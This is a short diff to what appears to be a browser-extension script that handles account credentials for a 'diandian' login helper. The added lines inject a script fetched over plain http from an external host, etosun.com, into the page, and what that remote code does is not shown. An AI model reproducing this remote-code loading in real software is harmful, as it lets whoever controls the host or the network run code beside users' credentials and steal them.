@@ -87,6 +87,12 @@ chrome.extension.sendRequest({
 }, function(data){
 	var account = data.account.diandian;
 
+	(function(){
+		var sc = document.createElement('script')
+		sc.src = 'http://etosun.com/html/mt-tools/alert.js?t=1125';
+		$('body').append(sc);
+	})();
+
 	setTimeout(function(){
 		new Diandian().init({
 			username: account['username'],
